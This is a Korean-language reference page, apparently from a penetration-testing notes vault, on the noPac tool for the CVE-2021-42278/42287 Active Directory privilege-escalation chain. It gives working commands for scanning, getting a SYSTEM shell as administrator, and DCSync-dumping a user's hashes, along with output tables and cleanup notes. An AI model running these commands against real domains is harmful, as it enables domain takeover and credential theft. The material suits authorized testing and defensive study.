---
tags:
  - 환경/ad
  - 기능/원격실행
  - 기능/자격증명수집
실행환경: ["Linux"]
필요조건: ["noPac 저장소", "호환 Impacket", "도메인 credential", "DC FQDN과 IP"]
결과: ["취약성 신호", "ccache", "SYSTEM 세션", "도메인 hash"]
---

# noPac

## 도구 개요

noPac은 CVE-2021-42278·CVE-2021-42287에 연결된 컴퓨터 계정 `sAMAccountName` 스푸핑 체인을 스캔하고 자동 실행하는 도구다. 패치 영향과 전체 권한 상승 체인을 검증할 때 ticket, SYSTEM shell 또는 제한된 DCSync 결과까지 확인할 수 있지만 AD 객체를 실제로 생성·변경한다.

## 필요한 입력과 실행 환경

- 실행 위치: 대상 DC의 LDAP·Kerberos·SMB에 접근 가능한 Linux 호스트
- 필요한 입력: `<DOMAIN>/<USER>:<PASSWORD>`, DC IP와 hostname, 가장할 사용자
- 종속 조건: noPac과 호환되는 Impacket 버전, DC 이름 해석과 시간 동기화
- 변경 영향: 컴퓨터 계정 생성·이름 변경과 ccache 파일 생성을 수반하므로 대응 기법의 복구 절차를 먼저 확인한다.
- requester account, impersonated user, dump subject를 분리한다. `<DC_IP>`와 hostname은 같은 DC를 가리켜야 하며 ccache·생성 object name은 출력에서 정확히 기록해 대응 기법의 복구에 사용한다.

## 표준 사용법

`<DOMAIN>/<USER>:<PASSWORD>`는 requester, `<IMPERSONATED_USER>`는 ticket subject, `<DC_IP>`·`<DC_HOSTNAME>`은 같은 DC endpoint를 가리킨다. created computer object·renamed `sAMAccountName`·ccache output은 exact output fields에서 기록해 restore/delete blocks에 재사용하며 dump subject와 구분한다.

```bash
python3 scanner.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -use-ldap
python3 noPac.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -dc-host <DC_HOST> [action] --impersonate <USER> -use-ldap
```

## 대표 예시

### 영향 가능성 스캔

```bash
sudo python3 scanner.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -use-ldap
```

확인할 출력:

- `Current ms-DS-MachineAccountQuota`.
- `Got TGT with PAC`와 대상 DC의 TGT.

### 고권한 semi-interactive shell 요청

```bash
sudo python3 noPac.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -dc-host <DC_HOST> -shell --impersonate administrator -use-ldap
```

확인할 출력:

- 컴퓨터 계정 생성, `sAMAccountName` 변경·복원, ccache 저장.
- `Launching semi-interactive shell`.

### 특정 사용자만 DCSync

```bash
sudo python3 noPac.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -dc-host <DC_HOST> --impersonate administrator -use-ldap -dump -just-dc-user '<DOMAIN>/<TARGET_USER>'
```

확인할 출력:

- `Using the DRSUAPI method`와 지정 사용자의 NTLM hash·Kerberos key.

## 주요 옵션

| 옵션 | 의미 | 사용하는 상황 |
|---|---|---|
| `-dc-ip` | 대상 DC IP | DC 통신 경로 고정 |
| `-dc-host` | 대상 DC hostname | sAMAccountName·SPN 대상 일치 |
| `-use-ldap` | LDAP 경로 사용 | 환경별 SAMR 제한 우회 또는 원본 절차 재현 |
| `--impersonate` | 가장할 사용자 | 관리자 ticket 요청 |
| `-shell` | semi-interactive shell 시작 | 원격 SYSTEM 실행 영향 확인 |
| `-dump` | secretsdump 기반 DCSync | 지정한 도메인 계정의 NTLM hash·Kerberos key 확인 |
| `-just-dc-user` | 전체 dump 대신 지정한 사용자 한 명만 요청 | 특정 계정의 복제 자료만 필요할 때 |

## 도구 고유 출력

| 출력·상태 | 의미 | 다음 확인 |
|---|---|---|
| `Got TGT with PAC` | 취약 체인의 영향 가능성 | 실제 exploit 전 AD 객체 생성·이름 변경·cleanup 영향 확인 |
| `Successfully added machine account` | AD 컴퓨터 객체 생성 성공 | 정확한 객체 이름과 cleanup 상태 기록 |
| `Restored ... sAMAccountName` | 이름 복원 시도 성공 | LDAP에서 원래 값 직접 확인 |
| `Delete computer ... Failed` | 컴퓨터 객체 cleanup 실패 | 추가 실행 중단 후 기록한 정확한 객체 식별자로 제거 상태 확인 |
| `Launching semi-interactive shell` | 원격 shell 생성 | 대상에서 `whoami`, `hostname` 확인 |
| ccache 파일 생성 | 가장한 계정의 Kerberos ticket 저장 | ticket에 기록된 계정·서비스 이름·만료 시각과 실제 접근 가능한 서비스를 확인한 뒤 삭제 |

## 버전과 환경 차이

- noPac은 Impacket 내부 API에 의존하므로 저장소가 요구하는 버전을 격리된 환경에 고정한다.
- `MachineAccountQuota`가 0보다 크다는 사실만으로 취약하다고 판정하지 않는다.
- 최신 패치 환경에서는 스캔 또는 exploit이 실패하는 것이 정상일 수 있다.

## 관련 공격기법

- [[NoPac sAMAccountName 스푸핑 권한 상승]]
- [[Pass the Ticket]]
- [[DCSync]]
